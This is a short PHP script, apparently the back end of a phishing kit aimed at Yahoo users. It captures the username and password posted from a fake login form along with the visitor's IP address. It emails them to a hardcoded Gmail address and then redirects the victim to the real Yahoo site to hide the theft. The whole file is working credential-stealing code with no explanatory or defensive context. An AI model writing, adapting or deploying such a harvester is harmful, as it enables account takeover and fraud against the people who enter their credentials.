<?

$ip = getenv("REMOTE_ADDR");
$message .= "User Name ".$_POST['username']."\n";
$message .= "Password ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Powered By kenpie------------------------------\n";

$recipient = "edwardcollins001@gmail.com";
$subject = "yahoo";
$headers = "";
     mail("$to", $subject, $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: http://www.yahoo.com");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?> 